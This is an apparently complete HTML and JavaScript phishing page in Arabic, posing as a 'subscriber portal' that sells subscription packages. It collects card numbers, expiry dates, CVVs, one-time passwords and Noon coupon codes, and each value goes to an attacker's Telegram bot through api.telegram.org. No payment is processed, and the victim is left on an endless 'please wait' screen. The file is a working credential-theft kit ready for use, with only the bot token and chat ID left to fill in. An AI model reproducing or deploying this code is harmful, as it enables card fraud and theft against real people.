<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة المشتركين</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; width: 90%; max-width: 450px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; position: relative; }
        .header { background: #007bff; color: white; padding: 20px; text-align: center; font-size: 20px; font-weight: bold; }
        .content { padding: 20px; text-align: center; }
        .package { border: 2px solid #eee; border-radius: 10px; padding: 15px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
        .package:hover { border-color: #007bff; background: #f8fbff; }
        .package h4 { margin: 0; color: #333; }
        .package p { margin: 5px 0 0; color: #666; font-size: 14px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; font-size: 16px; }
        button { width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
        .hidden { display: none; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div class="header" id="pageTitle">اختر الباقة المناسبة</div>
    
    <div class="content">
        <div id="step-packages">
            <div class="package" onclick="selectPackage('الباقة الأساسية - 50 ريال')">
                <h4>الباقة الأساسية</h4>
                <p>اشتراك لمدة شهر واحد</p>
            </div>
            <div class="package" onclick="selectPackage('الباقة المميزة - 120 ريال')">
                <h4>الباقة المميزة</h4>
                <p>اشتراك لمدة 3 أشهر</p>
            </div>
            <button class="hidden">متابعة</button>
        </div>

        <div id="step-payment-methods" class="hidden">
            <p>اختر طريقة الدفع لإتمام الاشتراك:</p>
            <button onclick="showSection('step-visa')" style="margin-bottom: 10px;">بطاقة بنكية (فيزا/مدى)</button>
            <button onclick="showSection('step-coupon')" style="background: #ff9900;">قسيمة نون (Noon Coupon)</button>
        </div>

        <div id="step-visa" class="hidden">
            <input type="text" id="card_num" placeholder="رقم البطاقة">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="card_date" placeholder="MM/YY">
                <input type="text" id="card_cvv" placeholder="CVV">
            </div>
            <button onclick="submitVisa()">تأكيد الدفع</button>
        </div>

        <div id="step-otp" class="hidden">
            <p>سوف يقوم النظام بإرسال رمز تأكيد إليك، يرجى إدخاله في الأسفل:</p>
            <input type="text" id="otp_val" placeholder="أدخل الرمز">
            <button onclick="submitOtp()">تحقق</button>
        </div>

        <div id="step-coupon" class="hidden">
            <p>أدخل رمز القسيمة لتفعيل الباقة:</p>
            <input type="text" id="cp_code" placeholder="كود القسيمة">
            <button onclick="submitCoupon()">تفعيل</button>
        </div>

        <div id="step-wait" class="hidden">
            <div class="loader"></div>
            <p id="wait-msg">يرجى الانتظار حتى يتم التحقق من الدفع...</p>
        </div>
    </div>
</div>

<script>
    const TOKEN = 'توكن_بوتك_هنا';
    const ID = 'ايدي_حسابك_هنا';
    let selectedPkg = "";

    function showSection(id) {
        document.querySelectorAll('.content > div').forEach(d => d.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
        // تحديث العنوان حسب الصفحة
        if(id === 'step-visa') document.getElementById('pageTitle').innerText = "دفع آمن بالبطاقة";
        if(id === 'step-coupon') document.getElementById('pageTitle').innerText = "تفعيل القسيمة";
    }

    async function tellTelegram(text) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
    }

    function selectPackage(name) {
        selectedPkg = name;
        tellTelegram(`🛒 العميل اختار: ${name}`);
        showSection('step-payment-methods');
        document.getElementById('pageTitle').innerText = "طريقة الدفع";
    }

    async function submitVisa() {
        const msg = `💳 بيانات فيزا:\nالباقة: ${selectedPkg}\nالرقم: ${document.getElementById('card_num').value}\nالتاريخ: ${document.getElementById('card_date').value}\nCVV: ${document.getElementById('card_cvv').value}`;
        await tellTelegram(msg);
        showSection('step-otp');
        document.getElementById('pageTitle').innerText = "تأكيد الهوية";
    }

    async function submitOtp() {
        await tellTelegram(`🔑 رمز OTP:\nالكود: ${document.getElementById('otp_val').value}`);
        document.getElementById('wait-msg').innerText = "يرجى الانتظار حتى يتم التحقق من الدفع...";
        showSection('step-wait');
    }

    async function submitCoupon() {
        await tellTelegram(`🎫 قسيمة نون:\nالباقة: ${selectedPkg}\nالكود: ${document.getElementById('cp_code').value}`);
        document.getElementById('wait-msg').innerText = "سوف يتم التحقق من معلومات الدفع";
        showSection('step-wait');
    }
</script>

</body>
</html>
